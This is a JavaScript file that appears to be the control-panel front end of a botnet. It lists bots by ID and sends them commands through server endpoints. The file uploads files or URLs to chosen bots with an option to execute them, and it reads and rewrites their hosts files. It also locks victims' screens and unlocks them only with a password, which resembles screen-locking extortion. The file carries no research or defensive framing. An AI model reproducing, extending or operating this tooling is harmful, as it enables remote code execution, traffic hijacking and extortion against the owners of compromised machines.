
    function getreq(endpoint,o){
		
		fetch(endpoint)
        .then(response => {
            if (!response.ok) {
                throw new Error('response error');
            }
            return response.text();
        })
        .then(data => {
			if(o!=null){o.value = data;}
			
           
        })
        .catch(error => {
            console.error('Error:', error);
        });
		
	}
	
	
	
	function openModal(id,namebot,modalid) {
        
		
		if(modalid=="hostsModal"){
			
			document.getElementById('hosts').value="";
			var tmpu="hosts.php?id="+id;
			var hoststxt=getreq(tmpu,document.getElementById('hosts'));
			document.getElementById(modalid).style.display = 'block';
			document.getElementById('botnamehosts').innerHTML =namebot;
			document.getElementById('botidhosts').value=id;
			
			
		}
		else {
			
			document.getElementById(modalid).style.display = 'block';
			document.getElementById('botname').innerHTML =namebot;
			document.getElementById('botid').value=id;
			
		}
		
        
    }


    function closeModal(modalid) {
        document.getElementById(modalid).style.display = 'none';
        
    }




function checkbox(){
if(chkbox.checked){
uploadForm.style.display = "none";
link.removeAttribute('hidden');

}


else {uploadForm.style.display = "block";link.setAttribute('hidden', 'true');}
}





function postdata(endpoint,data,namepost){
if(data===""){alert("data is empty");return;}
var formData = new FormData();
formData.append(namepost, data);

fetch(endpoint, {
    method: 'POST',
    body: formData
})
.then(response => {
    if (response.ok) {
        alert('OK');
    } else {
        alert('Error:', response.status);
    }
})
.catch(error => {
    console.error('Error:', error);
});


}

function uploadFile() {
	var isurl=false;
	if(chkbox.checked){isurl=true;}
	var endpoint="upload.php?exec=";
	if(run.checked){endpoint=endpoint+"1";}
	else {endpoint=endpoint+"0";}
	endpoint=endpoint+"&id="+document.getElementById('botid').value;
	if(isurl){postdata(endpoint,document.getElementById('link').value,'urlup');return;}
	alert("File is being uploaded ...");

    var fileInput = document.getElementById('file');

if (fileInput.files.length > 0) {
    var file = fileInput.files[0];
    var formData = new FormData();
    formData.append('file', file);
    
    fetch(endpoint, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            alert('File uploaded successfully.');
        } else {
            alert('Error uploading file. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
} else {
    alert('Please select a file.');
}
}


function HostsBlock(){
	var txt = document.getElementById('hosts');
    var val = txt.value;
	if(val===""){val="# ";}
	var endpoint="hosts.php?id="+document.getElementById('botidhosts').value;
	postdata(endpoint,val,'hosts');
	
	
	
}

function screenLock(id){
	
var endpoint="lock.php?status=1&id="+id;
alert("Locking...");
getreq(endpoint,null);

}

function screenUnlock(id){

let pw = prompt("password:", "machinepassword");
if(pw==null){return;}

var endpoint="lock.php?status=0&id="+id+"&password="+pw;
getreq(endpoint,null);
getreq(endpoint,null);

}
